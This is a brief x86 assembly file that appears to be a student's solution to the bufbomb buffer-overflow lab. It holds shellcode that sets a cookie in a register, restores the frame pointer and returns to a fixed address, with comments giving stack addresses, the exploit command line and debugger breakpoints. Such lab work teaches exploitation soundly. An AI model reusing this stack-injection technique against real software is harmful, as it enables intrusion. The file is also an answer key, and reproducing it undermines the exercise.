# gcc kaboom.s -c -o kaboom.o -nostdlib -m32
.text
    movl $0x7b52e696, %eax # %eax = my cookie
    leal 0x28(%esp), %ebp 
    push $0x8048e15
    ret
# old ebp <-ebp <old eip> at 0x55683c54
# attack code at 0x55683c54-524 = 0x55683c54 - 0x20c = 0x55683a48
# ./bufbomb -u U202115325 < kaboom_raw.hex -n
# b *0x8049221
# b *0x55683c45
# x /xw $esp